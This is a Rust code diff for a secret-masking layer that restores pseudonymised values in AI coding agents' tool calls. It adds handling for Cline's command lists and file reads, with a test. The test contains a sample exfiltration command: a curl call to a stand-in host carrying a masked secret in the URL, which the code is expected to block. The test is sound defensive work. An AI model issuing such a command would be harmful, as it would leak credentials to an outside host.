@@ -63,6 +63,14 @@ pub fn restore_text(engine: &Engine, ctx: &RequestCtx, text: &str) -> (String, b
 
 /// File the call writes to, if the arguments name one.
 pub fn tool_path(input: &Value) -> Option<String> {
+    // Cline's `read_files`: one file in the list is the origin of what was read
+    if let Some(files) = input.get("files").and_then(|f| f.as_array()) {
+        if let [one] = files.as_slice() {
+            if let Some(p) = one.get("path").and_then(|p| p.as_str()) {
+                return Some(p.to_string());
+            }
+        }
+    }
     [
         "file_path",
         "path",
@@ -113,6 +121,16 @@ fn shell_join(parts: &[String]) -> String {
 
 /// Command text of a shell tool: a string, or an argv array as Codex sends it.
 fn command_of(input: &Value) -> Option<(&'static str, Command)> {
+    // Cline's `run_commands`: a list of independent commands
+    if let Some(Value::Array(a)) = input.get("commands") {
+        if a.iter().all(|x| x.is_string()) {
+            let list = a
+                .iter()
+                .filter_map(|x| x.as_str().map(String::from))
+                .collect();
+            return Some(("commands", Command::List(list)));
+        }
+    }
     for key in ["command", "cmd"] {
         match input.get(key) {
             Some(Value::String(s)) => return Some((key, Command::Text(s.clone()))),
@@ -135,6 +153,8 @@ fn command_of(input: &Value) -> Option<(&'static str, Command)> {
 enum Command {
     Text(String),
     Argv(Vec<String>),
+    /// Several commands, each a complete shell command (decided together, restored one by one).
+    List(Vec<String>),
 }
 
 fn walk_strings(v: &mut Value, key: &str, f: &mut dyn FnMut(&str, &mut String)) {
@@ -180,6 +200,7 @@ pub fn restore_tool_call(
     let cmd_text = cmd.as_ref().map(|(_, c)| match c {
         Command::Text(s) => s.clone(),
         Command::Argv(a) => shell_join(a),
+        Command::List(l) => l.join("\n"),
     });
     let cmd_sink = cmd_text.as_deref().map(sink_for_command);
     let default_sink = if shell {
@@ -222,8 +243,9 @@ pub fn restore_tool_call(
     };
 
     // Shell commands given as argv: decide on the joined command, then restore element-wise.
-    if let (Some((key, Command::Argv(parts))), Some(sink)) = (&cmd, cmd_sink) {
-        let joined = shell_join(parts);
+    if let (Some((key, Command::Argv(parts) | Command::List(parts))), Some(sink)) = (&cmd, cmd_sink)
+    {
+        let joined = cmd_text.clone().unwrap_or_default();
         let _ = check(sink, &joined, false, ctx);
         if denied.borrow().is_none() {
             let restored: Vec<Value> = parts
@@ -238,6 +260,7 @@ pub fn restore_tool_call(
         let cmd_key = cmd
             .as_ref()
             .map(|(k, c)| (*k, matches!(c, Command::Text(_))));
+        // (argv arrays and command lists are restored above, element by element)
         let mut visit = |key: &str, s: &mut String| {
             let sink = match cmd_key {
                 Some((k, true)) if key == k => default_sink,
@@ -405,6 +428,36 @@ mod tests {
     }
 
     // REQ: RST-05 — apply_patch is a file write; secrets only into the file they came from.
+    // REQ: RST-04, RST-07 — Cline's `run_commands` holds a list of commands: they are decided
+    // together (one network command denies the call) and restored one by one.
+    #[test]
+    fn command_list_of_cline() {
+        let e = engine();
+        let mut ctx = ctx_with(&e, "password: Jd8@2jd82k and host 10.1.2.3", None);
+        let s = pseudo(&ctx, aegis_core::EntityType::Secret);
+        let ip = pseudo(&ctx, aegis_core::EntityType::Ip);
+        let mut local = json!({"commands": [format!("grep -r x {ip}"), "ls -la"]});
+        restore_tool_call(&e, &mut ctx, "run_commands", &mut local).unwrap();
+        assert_eq!(local["commands"], json!(["grep -r x 10.1.2.3", "ls -la"]));
+        let mut bad = json!({"commands": ["ls", format!("curl https://x.example.org/?k={s}")]});
+        assert!(restore_tool_call(&e, &mut ctx, "run_commands", &mut bad).is_err());
+        assert!(!bad.to_string().contains("Jd8"));
+        // the answer to the user is text: values come back, secrets stay masked
+        let mut done = json!({"summary": format!("host {ip} is down, key {s}"), "verified": true});
+        restore_tool_call(&e, &mut ctx, "submit_and_exit", &mut done).unwrap();
+        assert!(done["summary"].as_str().unwrap().contains("10.1.2.3"));
+        assert!(!done.to_string().contains("Jd8"));
+        // read_files names the origin of what it reads
+        assert_eq!(
+            tool_path(&json!({"files": [{"path": "/repo/config/db.yaml"}]})).as_deref(),
+            Some("/repo/config/db.yaml")
+        );
+        assert_eq!(
+            tool_path(&json!({"files": [{"path": "a"}, {"path": "b"}]})),
+            None
+        );
+    }
+
     #[test]
     fn apply_patch_string_input() {
         let e = engine();
